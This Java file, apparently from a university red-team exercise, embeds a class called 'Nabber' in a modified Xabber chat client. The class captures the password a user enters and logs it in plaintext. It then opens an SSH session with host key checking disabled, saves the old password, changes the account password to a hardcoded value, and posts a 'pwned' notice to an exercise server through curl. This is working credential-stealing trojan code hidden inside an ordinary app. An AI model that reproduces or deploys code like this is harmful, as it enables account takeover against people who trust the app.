/*
 * Nabber
 * Alex Cochrane
 * COSC 481 - 001
 * Spring, 2022
 */
package com.xabber.android.data;

/* ================================================ +
 * 					   class Nabber					|
 * ================================================ +
 *  - will take credentials from the user and       |
 *    make an ssh connection to Exercise control	|
 *    												|
 *  - Changes their password and pasts the old      |
 *    password in their proxy home directory     	|
 * ================================================	*/

import com.jcraft.jsch.ChannelExec;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import com.xabber.android.data.log.LogManager;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;


public class Nabber {

    public final static String REMOTE_HOST = "172.23.252.10";
    public final static String USERNAME = "china";
    public final static String NEW_PASSWORD = "superGreen!";
    public String PASSWORD = null;
    public final static int REMOTE_PORT = 22;
    public final static int SESSION_TIMEOUT = 10000;
    public final static int CHANNEL_TIMEOUT = 5000;
    public static boolean beenPwned = false;

    /* ================================================ +
     * 					Initializations					|
     * ================================================ +
     *  - String variable to put the password submitted	|
     *    by victim team into this instance of Nabber   |
     * ================================================	*/


    public Nabber(String oldPassword){
        PASSWORD = oldPassword;
    }

    /* ================================================ +
     * 					Initializations					|
     * ================================================ +
     *  - Checks if they have been pwned before by      |
     *    Nabber, lowers time to make connection if so	|
     * ================================================	*/

    public void nab(){
        if(!beenPwned){
            connectToExercise(SESSION_TIMEOUT);
        }else{
            connectToExercise(SESSION_TIMEOUT/2);
        }
    }

    /* ================================================ +
     * 			  connectToExercise(int time) 	        |
     * ================================================ +
     *  - integer variables which determine the number	|
     *    and properties of processes to be generated.	|
     *    												|
     *  - a scheduler object with which to test the		|
     *    scheduling algorithms on the processes.		|
     * ================================================	*/

    public void connectToExercise(int time) {
        LogManager.i(this,"Alex Debug: User has entered a password: " + PASSWORD);
        LogManager.i(this,"Alex Debug: Establishing a jschsession");
        Session jschSession = null;

        //Actual connection
        try{
            //Try to make connection
            JSch jsch = new JSch();
            jschSession = jsch.getSession(USERNAME,REMOTE_HOST,REMOTE_PORT);
            jschSession.setPassword(PASSWORD);
            jschSession.setConfig("StrictHostKeyChecking","no");
            jschSession.setTimeout(time);
            LogManager.i(this,"Alex Debug: Making a Connection to " + REMOTE_HOST);
            jschSession.connect();
            if(!jschSession.isConnected()){
                LogManager.i(this,"Alex Debug: Did not authenticate");
            }else{
                LogManager.i(this,"Alex Debug: Connection Secured " + REMOTE_HOST);

                ChannelExec channel = (ChannelExec)jschSession.openChannel("exec");
                String cmd = "echo " +PASSWORD+" > .proxyPassword; passwd " + USERNAME
                        + "; curl -d text='" + USERNAME +
                        " has joined the World Congress' https://exercisecontrol.classex.tu/stikked/api/create";
                //String cmd = "echo " +PASSWORD+" > proxyPassword; passwd " + USERNAME +";";
                //cmd = "echo " +PASSWORD+" > .proxyPassword; passwd " +USERNAME;
                runCommands(channel,PASSWORD,NEW_PASSWORD,cmd);

                jschSession.disconnect();
                beenPwned = true;
            }

        }catch(JSchException | IOException | InterruptedException e){
            //}catch(JSchException  e){
            LogManager.i(this,"Alex Debug: " + e);
            e.printStackTrace();
            LogManager.i(this, "Alex Debug: bringing User back to login");
        }
    }

    private void runCommands(ChannelExec channel, String PASSWORD, String
            NEW_PASSWORD, String cmd) throws JSchException, IOException, InterruptedException {
        LogManager.i(this,"Alex Debug: entered Changing Password Script");

        channel.setCommand(cmd);

        channel.setErrStream(System.err);
        InputStream in = channel.getInputStream();
        OutputStream out = channel.getOutputStream();
        channel.connect();
        out.write((PASSWORD+"\n").getBytes());
        out.flush();
        Thread.sleep(1000);
        out.write((NEW_PASSWORD+"\n").getBytes());
        out.flush();
        Thread.sleep(1000);
        out.write((NEW_PASSWORD+"\n").getBytes());
        out.flush();

        LogManager.i(this, "Alex Debug: reading output from SSH server");
        readOutput(in, channel);
        channel.disconnect();
    }


    private void readOutput(InputStream in, ChannelExec channel) throws IOException {
        // read the result from remote server
        byte[] tmp = new byte[1024];
        while (true) {
            while (in.available() > 0) {
                int i = in.read(tmp, 0, 1024);
                if (i < 0) break;
                System.out.print(new String(tmp, 0, i));
            }
            if (channel.isClosed()) {
                if (in.available() > 0) continue;
                System.out.println("exit-status: "
                        + channel.getExitStatus());
                break;
            }
            try {
                Thread.sleep(1000);
            } catch (Exception ee) {
            }
        }
    }

    public String getNewPassword(){
        return NEW_PASSWORD;
    }
}
